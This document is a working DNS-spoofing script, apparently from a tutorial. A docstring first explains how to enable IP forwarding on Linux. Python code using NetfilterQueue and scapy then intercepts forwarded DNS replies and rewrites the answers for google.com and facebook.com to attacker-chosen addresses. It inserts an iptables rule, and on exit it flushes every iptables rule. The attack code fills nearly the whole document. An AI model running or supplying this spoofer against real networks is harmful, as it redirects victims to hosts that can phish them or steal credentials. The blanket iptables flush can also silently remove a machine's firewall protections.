"""
how to enable disable ip forwarding in linux:

Temporal IP Forwarding:
If you want to enable IP forwarding temporarily, you can easily change the value from 0 to 1 of the ip_forward file:

$ echo 1 > /proc/sys/net/ipv4/ip_forward

If you want to get the current value of ip_forward, you can simply use cat command:

$ cat /proc/sys/net/ipv4/ip_forward
output:
1

Permanent IP Forwarding:
The IP forwarding configuration file in Debian-based distributions is located in /etc/sysctl.conf. As a result,
we need to add IP forward configuration there, let’s edit that file:

$ nano /etc/sysctl.conf

Then add the following line:

net.ipv4.ip_forward=1

Usually, you’ll see this line exists but commented with the '#', you can either remove the '#' or add a whole new line.

Also, if you want to enable IP forwarding on IPv6 instead of IPv4, then add the line:

net.ipv6.conf.all.forwarding=1

Similarly, the line is already there, you can either uncomment the line or add it. Finally, save the file and exit.

Now this won’t take effect immediately, you can either reboot your system, or reload the proc file system using
the following command:

$ /etc/init.d/procps restart
"""
# NetfilterQueue provides access to packets matched by an iptables rule in Linux.
# Packets so matched can be accepted, dropped, altered, or given a mark.
# To send packets destined for your LAN to the script, type something like:
#
# iptables -I INPUT -d 192.168.0.0/24 -j NFQUEUE --queue-num 1
#
# iptables -I FORWARD -j NFQUEUE --queue-num 0
#
# apt-get install build-essential python-dev libnetfilter-queue-dev
# pip3 install netfilterqueue scapy scapy-python3
#
# Windows native L3 Raw sockets are only usable as administrator ! Install Winpcap/Npcap to workaround !
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

# DNS mapping records, feel free to add/modify this dictionary
# for example, google.com will be redirected to 192.168.1.100
dns_hosts = {
    b"www.google.com.": "192.168.1.100",
    b"google.com.": "192.168.1.100",
    b"facebook.com.": "172.217.19.142"
}


def process_packet(packet):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After ]:", scapy_packet.summary())
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()


def modify_packet(packet):
    """
    Modifies the DNS Resource Record `packet` ( the answer part)
    to map our globally defined `dns_hosts` dictionary.
    For instance, whenever we see a google.com answer, this function replaces
    the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
    """
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
        return packet
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.1.100"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet


QUEUE_NUM = 0
# insert the iptables FORWARD rule
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
# instantiate the netfilter queue
queue = NetfilterQueue()

try:
    # bind the queue number to our callback `process_packet`
    # and start it
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
    # if want to exit, make sure we
    # remove that rule we just inserted, going back to normal.
    os.system("iptables --flush")



